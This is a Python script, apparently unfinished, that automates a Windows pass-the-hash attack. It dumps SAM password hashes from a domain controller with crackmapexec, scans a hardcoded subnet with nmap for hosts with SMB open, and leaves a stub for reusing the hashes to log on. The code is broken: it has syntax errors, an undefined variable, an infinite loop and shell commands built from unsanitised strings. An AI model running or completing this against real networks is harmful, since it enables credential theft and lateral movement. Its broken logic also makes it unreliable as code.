import argparse
import re
import subprocess
import sys

# Step 1: use crackmapexec to do a SAM grab
# ip: a string IP address for the domain controller
# username: string (for the above IP)
# password: string (for the above IP)
# Returns: a list where each element is the formatted username and hash
def samGrab(ip, username, password):
    command = 'crackmapexec --sam ' + ip + ' -u ' + username + ' -p ' + password + """ | sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mK]//g" | awk '$6 ~ /^.*:::$/{print $6}'"""
    return subprocess.check_output(command, shell=True).decode("utf-8").strip().split('\n')

# Step 2: use nmap to find windows machines on the network
# ip: a string IP address (potentially containing ranges) for the network
# Returns: a list of Windows IP addresses
def osFingerprint(ipRange):
    command = 'nmap -O ' + ipRange
    output = subprocess.check_output(command, shell=True).decode("utf-8").split('\n')
    output = output[2:]
    result = [];
    chunks = [];
    while len(output) > 0:
        while output[0] == '':
            output = output[1:]
        pt = 0
        while output[pt] != '':
            pt = pt + 1
        chunks.append(output[0:pt])
    for c in chunks:
        thisip = re.findall(r'[0-9]+(?:\.[0-9]+){3}', c[0])
        if len(thisip) = 0:
            continue
        windows = False
        for i in range(1, len(c))
            if windows:
                continue
            if '445/tcp' in c[i]:
                windows = True
        if windows:
            result.append[thisip]
    return result

# Step 3: use crackmapexec to try and log on to the windows machines
# hashes: the correctly formatted (as a single string) hashes from the SAM grab
# ips: list of windows IPs found in step 2
# Returns: a dictionary mapping each windows IP to the result of trying to log on to that system (success/fail, root/not root)
def attemptLogon(hashes, ips):
    return None

# Step 4: can probably do this in main

# Helper methods

# input: list of hashes
# output: The correctly formatted hashes for use in crackmapexec logon attempts
def formatCrackmapSam(hashes):
    result = []
    for hash in hashes:
        username = ""
        hash_pass = ""
        end_of_username = hash.find(":")
        if idx == -1:
            continue
        username = hash[:end_of_username]
        start_of_hash = hash.find(":", end_of_username+1)
        hash_pass = hash[start_of_hash+1:-3]
        result.append((username, hash_pass))
    return result

def main():
    parser = argparse.ArgumentParser(description='Windows pass the hash hacking')
    parser.add_argument('ip_address', help='ip address of the windows target host')
    parser.add_argument('username', help='username of windows administrator')
    parser.add_argument('password', help='password of windows administrator')
    args = parser.parse_args()
    osFingerprint('10.202.208.0-255')


if __name__ == '__main__':
    return_code = main()
    sys.exit(return_code)
